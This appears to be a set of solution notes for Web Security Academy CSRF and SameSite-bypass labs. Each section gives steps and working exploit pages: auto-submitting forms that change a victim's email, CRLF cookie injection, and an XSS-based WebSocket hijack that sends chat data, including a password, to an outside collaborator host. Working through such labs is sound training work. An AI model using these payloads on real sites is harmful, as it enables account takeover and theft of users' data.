# Navigation
- [CSRF vulnerability with no defenses](#csrf-vulnerability-with-no-defenses)
- [CSRF where token validation depends on request method](#csrf-where-token-validation-depends-on-request-method)
- [CSRF where token validation depends on token being present](#csrf-where-token-validation-depends-on-token-being-present)
- [CSRF where token is not tied to user session](#csrf-where-token-is-not-tied-to-user-session)
- [CSRF where token is tied to non-session cookie](#csrf-where-token-is-tied-to-non-session-cookie)
- [CSRF where token is duplicated in cookie](#csrf-where-token-is-duplicated-in-cookie)
- [SameSite Lax bypass via method override](#samesite-lax-bypass-via-method-override)
- [SameSite Strict bypass via client-side redirect](#samesite-strict-bypass-via-client-side-redirect)
- [SameSite Strict bypass via sibling domain](#samesite-strict-bypass-via-sibling-domain)
- [SameSite Lax bypass via cookie refresh](#samesite-lax-bypass-via-cookie-refresh)
- [CSRF where Referer validation depends on header being present](#csrf-where-referer-validation-depends-on-header-being-present)
- [CSRF with broken Referer validation](#csrf-with-broken-referer-validation)
# CSRF vulnerability with no defenses
1. Construct the following malicious page
```html
<html>
	<body>
		<form action="https://0a25009b03ad310f810a896800ae008f.web-security-academy.net/my-account/change-email" method="POST">
			<input type="hidden" name="email" value="owned@evil.net" />
		</form>
		<script>
			document.forms[0].submit();
		</script>
	<body>
</html>
```
# CSRF where token validation depends on request method
1. Login > Change email
2. Request is using POST method
3. Removing CSRF returns a CSRF error message
4. Change request method to GET and notice CSRF error disappears
5. Construct the following malicious page
```html
<script src="https://0ae000ff048a47fdbaa4eac60095008a.web-security-academy.net/my-account/change-email?email=pwn@hacked.lol"/>
```
- This will issue a GET request
# CSRF where token validation depends on token being present
1. Login > Change email
2. Remove the CSRF token parameter completely lets a POST request work perfectly fine
3. Use the same POST payload from the first lab
# CSRF where token is not tied to user session
- Two logins `carlos` and `wiener`
1. Login > Change email
2. Replaying the request says CSRF token is invalid
3. Every time the page is refreshed a new CSRF token is generated
	1. Login to second account and retrieve their CSRF token from the HTML
	2. Provide the second account's CSRF token as the replayed request from step 2 and confirm that it works
4. Refresh on either account page to generate a new CSRF token
5. Construct a malicious page setting the CSRF token to a valid and unused token
```html
<html>
	<body>
		<form action="https://0a5c005804c94759ba15fe9a006d00f8.web-security-academy.net/my-account/change-email" method="POST">
			<input type="hidden" name="email" value="owned@evil.net" />
			<input type="hidden" name="csrf" value="8K8g89H3Ev8YNgSrRLheMsxMjR8J08My" />
		</form>
		<script>
			document.forms[0].submit();
		</script>
	<body>
</html>
```
# CSRF where token is tied to non-session cookie
1. Login > Change email
2. There is a `csrfKey` cookie connected to the CSRF token when trying to change email address
3. Using the search function sets a cookie with the value of the last thing submitted
4. Insert a URL-encoded carriage return and new line to inject a new `Set-Cookie` directive and make it the same value as your valid `csrfKey` in your session
```
GET /?search=testing123%0d%0aSet-Cookie:%20csrfKey=aRfXIxBYlxROAUegbxCa5JHjMlE6lwMz%3bSameSite=None
```
- This returns the following response
```
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=testing123
Set-Cookie: csrfKey=aRfXIxBYlxROAUegbxCa5JHjMlE6lwMz;SameSite=None; Secure; HttpOnly
```
5. Host the following malicious page on the exploit server
```html
<html>
	<body>
		<form action="https://0a1a004d0454b0fc80ad26f4007d0028.web-security-academy.net/my-account/change-email" method="POST">
			<input type="hidden" name="email" value="owned@evil.net" />
			<input type="hidden" name="csrf" value="lHETNosctwO9vAFwlG6CvkubSiZw6WHT" />
		</form>
<img src="https://0a1a004d0454b0fc80ad26f4007d0028.web-security-academy.net/?search=testing123%0d%0aSet-Cookie:%20csrfKey=aRfXIxBYlxROAUegbxCa5JHjMlE6lwMz%3bSameSite=None" onerror=document.forms[0].submit() ">
	<body>
</html>
```
# CSRF where token is duplicated in cookie
  1. Exact same process as the process above
  2. Just make sure the CSRF token value is the same as the cookie
  3. Use the same exploit from above
# SameSite Lax bypass via method override
1. Login
	1. Notice that `Set-Cookie` does not have the `SameSite=None` attribute any more
	2. We also know the victim uses chrome which will set the SameSite policy to Lax if not specified meaning we need to use a GET request
2. Change email
3. Send request to repeater
4. Change method to GET
	1. Returns 405 Method Not Allowed
	2. Only POST is allowed
5. Host the following malicious page
```html
<html>
	<body>
		<form action="https://0ad6009f0363761a805c03900006009c.web-security-academy.net/my-account/change-email" method="GET">
			<input type="hidden" name="_method" value="POST"> <input type="hidden" name="email" value="pwned@hacked.lol">
		</form>
		<script>
			document.forms[0].submit();
		</script>
	<body>
</html>
```
- Will issue a GET request and "override" as a POST method using `_method`
# SameSite Strict bypass via client-side redirect
1. Login > Change email
2. GET method is supported
3. View a blog item and post a comment
4. On the comment confirmation page we get redirected after a short period
5. Look in Burp history and see the following JavaScript being used
```js
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```
- This JavaScript is taking the value of the `postId` parameter and setting it in the URL
6. Send the comment confirmation page to repeater and test the `postId` parameter and see the value is inserted in to `href` attribute in the HTML response
7. Using this information and knowing that GET requests can be used to change the email of a target account, construct the following exploit
```html
<script>
document.location = "https://0ae5001d03e5f72b8107701600a50085.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=pwned%40hacked.lol%26submit=1"
</script>
```
# SameSite Strict bypass via sibling domain
1. Navigate target page
2. Request to `/resources/js/chat.js` reveals an origin server in the HTTP response
	1. `Access-Control-Allow-Origin: https://cms-0ad4003e04b75aba806603d5002e00f1.web-security-academy.net`
3. Access this URL reveals a login page
4. Username parameter is vulnerable to reflected XSS. This attack can also be performed as a GET request
	1. `GET /login?username=admin<script>alert(document.domain)</script>&password=admin`
5. Navigate to live chat feature, identify that it opens a WebSocket connection
6. Analyse the WebSocket handshake and see that there are no CSRF protections (except that the cookie is SameSite)
7. Clone the connection and make a new WebSocket
	1. Change the `Origin:` to something arbitrary and confirm that the request opens a new WebSocket connection
```HTTP
GET /chat HTTP/1.1
Host: 0ad4003e04b75aba806603d5002e00f1.web-security-academy.net
Connection: Upgrade
Upgrade: websocket
Origin: https://example.com
Sec-WebSocket-Version: 13
Cookie: session=cgVBy0ODyBDFlkWfUmeNWV3MxYmw3Zqw
Sec-WebSocket-Key: 7P7WtdxwGWeU6e5BMLX6PA==
```
8. Now we've confirmed arbitrary origins can be used, test CSWSH on yourself using the exploit server
9. Host the following malicious page
```html
<script>
        var ws = new WebSocket('wss://<WEBSOCKET-URL>/chat');
        ws.onopen = function start(event) {
            ws.send("READY");
        }
        ws.onmessage = function handleReplay(event) {
            fetch('https://YOUR-COLLABORATOR-IP/', {
                mode: 'no-cors',
                method: "POST",
                body: (event.data)
            });
        }
        ws.send("Text has been sent to the server");
</script>
```
10. Viewing the exploit ourselves we open a WebSocket connection
11. To target a user and bypass the SameSite restriction, we can use the vulnerable Origin server identified in step 2 and craft an XSS payload inside to perform CSWSH
```html
<script>

window.location = "https://cms-0a92009d03bba46e80ca0381004f00b6.web-security-academy.net/login?username=test<script>
var ws = new WebSocket('wss://0a92009d03bba46e80ca0381004f00b6.web-security-academy.net/chat');
ws.onopen = function start(event) {
ws.send("READY");
}
ws.onmessage = function handleReplay(event) {
fetch('https://jylvymft66m33h1nle1xqwn6ixoock09.oastify.com/', {
mode: 'no-cors',
method: "POST",
body: (event.data)
});
}
ws.send("Text has been sent to the server");
</script>&password=tes"
</script>
```
12. URL encode the entire payload that is inside the `username` parameter
```html
<script>
window.location = "https://cms-0a92009d03bba46e80ca0381004f00b6.web-security-academy.net/login?username=test%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%39%32%30%30%39%64%30%33%62%62%61%34%36%65%38%30%63%61%30%33%38%31%30%30%34%66%30%30%62%36%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%20%73%74%61%72%74%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%20%68%61%6e%64%6c%65%52%65%70%6c%61%79%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%6a%79%6c%76%79%6d%66%74%36%36%6d%33%33%68%31%6e%6c%65%31%78%71%77%6e%36%69%78%6f%6f%63%6b%30%39%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%2f%27%2c%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6d%65%74%68%6f%64%3a%20%22%50%4f%53%54%22%2c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%62%6f%64%79%3a%20%28%65%76%65%6e%74%2e%64%61%74%61%29%0a%20%20%20%20%20%20%20%20%20%20%20%20%7d%29%3b%0a%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%54%65%78%74%20%68%61%73%20%62%65%65%6e%20%73%65%6e%74%20%74%6f%20%74%68%65%20%73%65%72%76%65%72%22%29%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=tes"
</script>
```
13. Deliver exploit to the victim
14. Read collaborator history to retrieve the password
# SameSite Lax bypass via cookie refresh
1. Login via SSO
2. Identify that `GET /social-login` triggers an OAuth authentication
3. Change email
	1. There is no CSRF token and only accepts POST request
4. Host a malicious page that will make the user open a new tab to trigger an SSO authentication flow then subsequently make a request to change their email
```html
<h1>click here</h1>
<script>
	window.onclick = () => {
		window.open('https://0a8100510364f0ab80cf031f000a00c7.web-security-academy.net/social-login');
}
</script>
<body>
	<form action="https://0a8100510364f0ab80cf031f000a00c7.web-security-academy.net/my-account/change-email" method="POST">
		<input type="hidden" name="email" value="pwned@evil.net" />
	</form>
<script>
	setTimeout(() => {
		document.forms[0].submit();
	}, "5000");
</script>
</body>
```
# CSRF where Referer validation depends on header being present
1. Login > Change email
2. Host normal POST CSRF attack
3. Receive error stating "Invalid referer header"
4. Check the request in Burp > Send to repeater
5. Removing entire `Referer` header returns a valid response
6. Host the following malicious page which includes a tag to remove the `Referer` header
```html
<html>
<meta name="referrer" content="no-referrer">
	<body>
		<form action="https://0ae4004103c7d359808ccb2e00f40043.web-security-academy.net/my-account/change-email" method="POST">
			<input type="hidden" name="email" value="pwned@evil.net" />
		</form>
		<script>
			document.forms[0].submit();
		</script>
	<body>
</html>
```
# CSRF with broken Referer validation
1. Login > Change email
2. Host normal POST CSRF attack
3. Receive error stating "Invalid referer header"
4. Check the request in Burp > Send to repeater
5. Including the target site as a URL query parameter bypasses the referer validation check
6. Host the following malicious page which includes a tag to force the browser to include the query string on the `Referer` header
```html
<html>
<meta name="referrer" content="unsafe-url">
	<body>
		<form action="https://0a8c002a0402e86180e25dd400ce0093.web-security-academy.net/my-account/change-email" method="POST">
			<input type="hidden" name="email" value="owned@evil.net" />
		</form>
		<script>
			document.forms[0].submit();
		</script>
	<body>
</html>
```
7. To make sure the referer header is set in the request, change the location of the exploit to the valid server (URL encode the `?`)
```
/exploit?https://0a8c002a0402e86180e25dd400ce0093.web-security-academy.net
```
